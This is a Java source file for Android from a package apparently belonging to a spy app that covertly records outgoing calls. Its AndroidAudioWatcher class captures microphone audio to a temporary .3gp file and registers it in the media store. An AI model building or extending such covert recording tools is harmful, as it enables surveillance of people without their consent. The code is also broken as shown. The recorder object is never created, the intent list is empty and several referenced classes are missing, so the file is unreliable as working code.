package com.example.spyapp.listenoutgoingcall;

import java.io.File;
import java.io.IOException;
import java.util.Iterator;

import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Bundle;
import android.provider.MediaStore;

public class AndroidAudioWatcher extends AndroidWatcher {
        private static final String[] INTENTS = { };
        
        private MediaRecorder mediaRecorder;
        private File audioFile = null;

        public AndroidAudioWatcher(Reporter reporter) {
                setReporter(reporter);
        }
        
        @Override
        public String[] getIntents() {
                return INTENTS;
        }
        
        @Override
        public void start(Event dc) {
                super.start(dc);
        }
        
        @Override
        public void service(AndroidEvent dc) {
                Intent intent = dc.getIntent();
                Bundle bundle = intent.getExtras();
                Logger.getDefault().debug("Data: " + intent.getDataString());
                for (Iterator<String> iterator = bundle.keySet().iterator(); iterator.hasNext(); ) {
                        Logger.getDefault().debug("Key: " + iterator.next());
                }
                super.service(dc);
        }

        /**
         * @param dc
         * @throws IOException
         */
        protected void startRecording(AndroidEvent dc) throws IOException {
                mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
                mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
                try {
                        audioFile = File.createTempFile("ibm", ".3gp", null);
                }
                catch (IOException e) {
                        Logger.getDefault().error("sdcard access error", e);
                        return;
                }
                mediaRecorder.setOutputFile(audioFile.getAbsolutePath());
                mediaRecorder.prepare();
                mediaRecorder.start();
        }

        protected void stopRecording(AndroidEvent dc) {
                mediaRecorder.stop();
                mediaRecorder.release();
                Context context = dc.getContext();              
                sendMediaScanner(context);
        }

        private void sendMediaScanner(Context context) {
                ContentValues values = new ContentValues(3);
                long current = System.currentTimeMillis();
                values.put(MediaStore.Audio.Media.TITLE, "audio" + audioFile.getName());
                values.put(MediaStore.Audio.Media.DATE_ADDED, new Integer((int)(current / 1000)));
                values.put(MediaStore.Audio.Media.MIME_TYPE, "audio/3gpp");
                values.put(MediaStore.Audio.Media.DATA, audioFile.getAbsolutePath());
                ContentResolver contentResolver = context.getContentResolver();
                Uri base = MediaStore.Audio.Media.EXTERNAL_CONTENT_URI;
                Uri newUri = contentResolver.insert(base, values);
                context.sendBroadcast(new Intent(Intent.ACTION_MEDIA_SCANNER_SCAN_FILE, newUri));
        }
}